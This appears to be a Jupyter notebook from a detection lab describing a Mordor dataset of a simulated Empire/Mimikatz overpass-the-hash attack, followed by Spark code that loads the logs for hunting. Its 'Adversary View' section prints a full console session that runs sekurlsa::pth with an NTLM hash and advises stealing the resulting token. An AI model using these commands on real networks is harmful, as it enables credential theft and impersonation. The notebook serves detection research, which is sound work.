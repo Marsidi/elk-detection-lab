{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire Mimikatz OPTH"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-190319131123 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/03/19 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Empire |\n",
    "| Simulation Script | https://github.com/hunters-forge/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries taking a hash into a fully-fledged Kerberos TGT"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: 8BLV6USC) > usemodule credentials/mimikatz/pth*\n",
    "(Empire: powershell/credentials/mimikatz/pth) > info\n",
    "\n",
    "              Name: Invoke-Mimikatz PTH\n",
    "            Module: powershell/credentials/mimikatz/pth\n",
    "        NeedsAdmin: True\n",
    "        OpsecSafe: True\n",
    "          Language: powershell\n",
    "MinLanguageVersion: 2\n",
    "        Background: True\n",
    "  OutputExtension: None\n",
    "\n",
    "Authors:\n",
    "  @JosephBialek\n",
    "  @gentilkiwi\n",
    "\n",
    "Description:\n",
    "  Runs PowerSploit's Invoke-Mimikatz function to execute\n",
    "  sekurlsa::pth to create a new process. with a specific\n",
    "  user's hash. Use credentials/tokens to steal the token\n",
    "  afterwards.\n",
    "\n",
    "Comments:\n",
    "  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com\n",
    "  http://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-\n",
    "  hash-with-mimikatz/\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name   Required    Value                     Description\n",
    "  ----   --------    -------                   -----------\n",
    "  CredID False                                 CredID from the store to use for ticket \n",
    "                                              creation.                               \n",
    "  domain False                                 The fully qualified domain name.        \n",
    "  ntlm   False                                 The NTLM hash to use.                   \n",
    "  user   False                                 Username to impersonate.                \n",
    "  Agent  True        8BLV6USC                  Agent to run module on.                 \n",
    "\n",
    "4f81f8c89a2a384f4a68credentials/mimikatz/pth) > set ntlm b415baa073a1 \n",
    "(Empire: powershell/credentials/mimikatz/pth) > set user Mmidge\n",
    "(Empire: powershell/credentials/mimikatz/pth) > set domain shire.com\n",
    "(Empire: powershell/credentials/mimikatz/pth) > execute\n",
    "[*] Tasked 8BLV6USC to run TASK_CMD_JOB\n",
    "[*] Agent 8BLV6USC tasked with task ID 3\n",
    "[*] Tasked agent 8BLV6USC to run module powershell/credentials/mimikatz/pth\n",
    "(Empire: powershell/credentials/mimikatz/pth) > Job started: 6DH2RP\n",
    "Hostname: IT001.shire.com / S-1-5-21-2511471446-1103646877-3980648787\n",
    "\n",
    "  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02\n",
    ".## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo) ** Kitten Edition **\n",
    "## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    "## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    "'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # sekurlsa::pth /user:Mmidge /domain:shire.com /ntlm:b415baa073a14f81f8c89a2a384f4a68\n",
    "user\t: Mmidge\n",
    "domain\t: shire.com\n",
    "program\t: cmd.exe\n",
    "impers.\t: no\n",
    "NTLM\t: b415baa073a14f81f8c89a2a384f4a68\n",
    "  |  PID  7920\n",
    "  |  TID  8308\n",
    "  |  LSA Process is now R/W\n",
    "  |  LUID 0 ; 85924706 (00000000:051f1b62)\n",
    "  \\_ msv1_0   - data copy @ 000001BD859AEBA0 : OK !\n",
    "  \\_ kerberos - data copy @ 000001BD85999068\n",
    "  \\_ aes256_hmac       -> null             \n",
    "  \\_ aes128_hmac       -> null             \n",
    "  \\_ rc4_hmac_nt       OK\n",
    "  \\_ rc4_hmac_old      OK\n",
    "  \\_ rc4_md4           OK\n",
    "  \\_ rc4_hmac_nt_exp   OK\n",
    "  \\_ rc4_hmac_old_exp  OK\n",
    "  \\_ *Password replace @ 000001BD85902A78 (32) -> null\n",
    "\n",
    "\n",
    "Use credentials/token to steal the token of the created PID.\n",
    "\n",
    "(Empire: powershell/credentials/mimikatz/pth) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_opth.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
